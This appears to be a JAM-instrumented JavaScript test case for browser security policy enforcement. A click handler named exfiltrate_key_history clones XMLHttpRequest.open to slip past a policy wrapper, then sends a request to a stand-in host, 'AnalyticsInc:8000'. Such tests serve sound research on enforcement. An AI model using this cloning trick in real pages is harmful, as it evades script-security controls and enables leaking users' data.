
JAM.startProfile('load');
function exfiltrate_key_history() {
  function v0() {
    function temp() {
      return JAM.call(that.apply, that, [this, arguments], JAM.policy.p36)
    }
    var that = this;
    var key$$14;
    for(key$$14 in this) {
      var v1 = JAM.call(this.hasOwnProperty, this, [key$$14], JAM.policy.p37);
      if(v1) {
        JAM.set(temp, key$$14, this[key$$14], JAM.policy.p13)
      }
    }
    return temp
  }
  xmlhttp = new XMLHttpRequest;
  var v2 = xmlhttp.open;
  v2.clone = v0;
  var v3 = xmlhttp;
  var v5 = xmlhttp.open;
  var v6 = JAM.call(v5.clone, v5, [], JAM.policy.p26);
  v3.opennew = v6;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true], JAM.policy.p27);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p26);
  return
}
var v4 = JAM.call(document.getElementById, document, ["test"], JAM.policy.p27);
JAM.set(v4, "onclick", exfiltrate_key_history);

JAM.stopProfile('load');
